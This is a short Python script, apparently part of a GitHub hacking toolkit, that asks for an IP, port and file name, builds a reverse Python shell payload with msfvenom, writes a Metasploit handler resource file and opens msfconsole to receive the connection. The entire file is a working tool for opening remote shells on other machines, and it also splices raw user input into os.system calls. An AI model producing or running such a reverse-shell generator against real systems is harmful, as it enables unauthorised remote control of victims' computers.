import os

#GeerxOS on github!

def py_shell():
    os.system("clear")
    os.system("figlet -f banner Python ")
    print("--> ")
    ip = input("IP: ")
    print("--> ")
    port = input("Port: ")
    print("--> ")
    name = input("Name: ")
    payload = 'cmd/unix/reverse_python'
    format= 'raw'
    ext= '.py'
    print("[!] Creating payload!! [!] ")
    os.system("msfvenom -p "+payload+" LHOST="+ip+" LPORT="+port+" -f "+format+" -o "+name+ext+"")
    print("Payload created!!")
    print("Running metasploit-framework!")
    os.system("echo 'use exploit/multi/handler' >> python_rever.rb")
    os.system("echo 'set payload "+payload+"' >> python_rever.rb")
    os.system("echo 'set lhost "+ip+"' >> python_rever.rb")
    os.system("echo 'set lport "+port+"' >> python_rever.rb")
    os.system("echo 'exploit' >> python_rever.rb")
    os.system("gnome-terminal -- msfconsole -r python_rever.rb &")
    input("Press enter")
    os.system("clear")